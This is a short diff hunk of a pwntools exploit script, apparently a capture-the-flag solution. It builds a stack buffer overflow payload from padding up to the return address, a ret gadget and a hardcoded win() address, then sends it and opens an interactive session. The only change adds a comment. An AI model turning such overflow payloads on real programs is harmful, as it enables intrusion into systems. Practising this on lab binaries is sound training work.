@@ -12,7 +12,7 @@ payload = flat(
     b'A' * OFFSET_TO_RIP,
     p64(ret_gadget),
     #p64(elf.sym.win),
-    p64(0x0040121b),
+    p64(0x0040121b), # win() address
 )
 p.send(payload)
 p.interactive()
